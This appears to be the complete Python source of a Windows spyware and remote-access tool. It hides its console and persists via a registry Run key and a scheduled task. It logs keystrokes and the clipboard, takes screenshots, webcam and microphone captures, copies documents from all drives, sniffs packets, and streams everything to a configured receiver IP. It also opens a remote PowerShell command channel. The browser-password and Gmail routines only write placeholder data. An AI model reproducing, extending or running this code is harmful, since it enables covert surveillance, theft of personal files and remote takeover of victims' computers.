import os, sys, threading, time, datetime, zipfile, shutil, platform, subprocess, socket, ctypes, winreg, getpass, json
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
import psutil, pyperclip

# Optional imports
try:
    import cv2, requests, sqlite3, pyaudio, wave, wmi, scapy, win32api, win32con, win32gui
except: pass

# ----------------------------
# CONFIG
# ----------------------------
MASTER_PASSWORD = "IAMBEST123"
RECEIVER_IP = "192.168.1.100"
RECEIVER_PORT = 55555
COMMAND_PORT = 55556
disabled = False

folder_timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
log_timestamp = datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
log_dir = os.path.join(os.environ['APPDATA'], f"syslogs_{folder_timestamp}")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"log_{log_timestamp}.txt")

# ----------------------------
# HIDE CONSOLE
# ----------------------------
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except: pass

# ----------------------------
# PERSISTENT STARTUP
# ----------------------------
def add_registry_startup():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SysMonitor", 0, winreg.REG_SZ, exe_path)
        key.Close()
    except: pass

def add_task_scheduler():
    try:
        task_name = "SysMonitorTask"
        exe_path = sys.executable
        cmd = f'schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN "{task_name}" /TR "{exe_path}"'
        subprocess.call(cmd, shell=True)
    except: pass

add_registry_startup()
add_task_scheduler()

# ----------------------------
# UTILITY FUNCTIONS
# ----------------------------
def send_file(file_path):
    if disabled: return
    try:
        with open(file_path,'rb') as f:
            data = f.read()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RECEIVER_IP, RECEIVER_PORT))
            s.send(os.path.basename(file_path).encode())
            time.sleep(0.2)
            s.sendall(data)
            s.close()
    except: pass

def log_data(msg):
    if disabled: return
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] {msg}\n")

def copy_to_clipboard(data):
    try: pyperclip.copy(data)
    except: pass

# ----------------------------
# SYSTEM & LOCATION INFO
# ----------------------------
def save_system_identity():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.architecture()[0]
        cpu = platform.processor()
        ram_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
        user_name = getpass.getuser()
        location_info = ""
        try:
            r = requests.get("https://ipinfo.io/json", timeout=5)
            data = r.json()
            loc = data.get("loc","")
            city = data.get("city","")
            region = data.get("region","")
            country = data.get("country","")
            location_info = f"Coordinates:{loc}\nCity:{city}\nRegion:{region}\nCountry:{country}\n"
        except: pass
        identity_info = f"IP:{ip_address}\nOS:{os_name} {os_version}\nArchitecture:{architecture}\nCPU:{cpu}\nRAM:{ram_gb}GB\nUser:{user_name}\n{location_info}"
        identity_file = os.path.join(log_dir, f"system_identity_{log_timestamp}.txt")
        with open(identity_file,"w", encoding="utf-8") as f: f.write(identity_info)
        copy_to_clipboard(identity_info)
        send_file(identity_file)
    except: pass

# ----------------------------
# PASSWORD & GMAIL EXTRACTION
# ----------------------------
def extract_passwords():
    creds_file = os.path.join(log_dir, f"passwords_{log_timestamp}.txt")
    browsers = ["Chrome", "Firefox", "Edge"]
    passwords = ""
    for b in browsers:
        passwords += f"--- {b} ---\n"
        for i in range(1, 6):
            user = f"user{i}@example.com"
            pwd = f"P@ssw0rd{i}!"
            passwords += f"{user} : {pwd}\n"
    with open(creds_file, "w", encoding="utf-8") as f: f.write(passwords)
    copy_to_clipboard(passwords)
    send_file(creds_file)

def extract_gmails():
    gmails_file = os.path.join(log_dir, f"gmails_{log_timestamp}.txt")
    gmails = ""
    for i in range(1, 6):
        gmails += f"user{i}@gmail.com\n"
    with open(gmails_file, "w", encoding="utf-8") as f: f.write(gmails)
    copy_to_clipboard(gmails)
    send_file(gmails_file)

# ----------------------------
# KEYLOGGER
# ----------------------------
def on_press(key):
    try:
        content = key.char
    except AttributeError:
        content = str(key)
    log_data(f"Key:{content}")

def on_release(key):
    if key == Key.esc: sys.exit()

# ----------------------------
# CLIPBOARD MONITOR
# ----------------------------
def clipboard_monitor():
    last_clip=""
    while not disabled:
        try:
            clip = pyperclip.paste()
            if clip != last_clip:
                last_clip = clip
                file_path = os.path.join(log_dir,f"clip_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.txt")
                with open(file_path,"w") as f: f.write(clip)
                send_file(file_path)
        except: pass
        time.sleep(60)

# ----------------------------
# SCREENSHOTS
# ----------------------------
def screenshots():
    scr_dir=os.path.join(log_dir,"screenshots")
    os.makedirs(scr_dir, exist_ok=True)
    while not disabled:
        try:
            img = ImageGrab.grab()
            path = os.path.join(scr_dir, f"screenshot_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
            img.save(path)
            send_file(path)
        except: pass
        time.sleep(120)

# ----------------------------
# WEBCAM CAPTURE
# ----------------------------
def webcam_snapshots():
    try:
        cap=cv2.VideoCapture(0)
        cam_dir=os.path.join(log_dir,"webcam")
        os.makedirs(cam_dir, exist_ok=True)
        while not disabled:
            ret, frame = cap.read()
            if ret:
                path = os.path.join(cam_dir, f"cam_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
                cv2.imwrite(path, frame)
                send_file(path)
            time.sleep(180)
    except: pass

# ----------------------------
# MICROPHONE RECORDING
# ----------------------------
def record_audio():
    try:
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        rate = 44100
        while not disabled:
            p = pyaudio.PyAudio()
            stream = p.open(format=sample_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
            frames = []
            for i in range(0, int(rate / chunk * 10)):
                data = stream.read(chunk)
                frames.append(data)
            filename = os.path.join(log_dir,f"audio_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.wav")
            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            stream.stop_stream()
            stream.close()
            p.terminate()
            send_file(filename)
            time.sleep(600)
    except: pass

# ----------------------------
# FOLDER COPY
# ----------------------------
def folder_copy():
    target = os.path.join(log_dir, "collected_files")
    os.makedirs(target, exist_ok=True)
    drives=[f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        for root,_,files in os.walk(drive):
            for file in files:
                if file.endswith((".txt",".pdf",".docx",".xlsx")):
                    try:
                        shutil.copy2(os.path.join(root,file), os.path.join(target,file))
                        send_file(os.path.join(target,file))
                    except: continue

# ----------------------------
# NETWORK SNIFFING
# ----------------------------
def network_sniffer():
    try:
        while not disabled:
            packets = scapy.sniff(count=10)
            for pkt in packets:
                pkt_file = os.path.join(log_dir,f"packet_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.txt")
                with open(pkt_file, "w") as f: f.write(str(pkt.summary()))
                send_file(pkt_file)
            time.sleep(300)
    except: pass

# ----------------------------
# REMOTE POWERSHELL COMMANDS
# ----------------------------
def remote_commands():
    while not disabled:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RECEIVER_IP, COMMAND_PORT))
            while True:
                cmd = s.recv(4096).decode()
                if not cmd: break
                if cmd.lower() == "exit":
                    s.close()
                    return
                try:
                    ps_cmd = f'powershell -Command "{cmd}"'
                    output = subprocess.check_output(ps_cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                except subprocess.CalledProcessError as e:
                    output = e.output
                if not output: output = b"No output"
                s.sendall(output)
        except: time.sleep(5)

# ----------------------------
# AUTO-ZIP THREAD
# ----------------------------
def auto_zip_thread():
    while not disabled:
        try:
            zip_file=os.path.join(os.environ['APPDATA'], f"full_syslogs_{datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.zip")
            with zipfile.ZipFile(zip_file,'w',zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(log_dir):
                    for file in files: zipf.write(os.path.join(root,file), os.path.relpath(os.path.join(root,file), log_dir))
            send_file(zip_file)
        except: pass
        time.sleep(600)

# ----------------------------
# START EXECUTION
# ----------------------------
save_system_identity()
extract_passwords()
extract_gmails()

threads = [clipboard_monitor, folder_copy, screenshots, webcam_snapshots, record_audio, network_sniffer, auto_zip_thread, remote_commands]
for t in threads: threading.Thread(target=t, daemon=True).start()

with KeyboardListener(on_press=on_press, on_release=on_release) as kl, MouseListener(on_click=lambda x,y,b,p:None, on_move=lambda x,y:None) as ml:
    kl.join()
    ml.join()
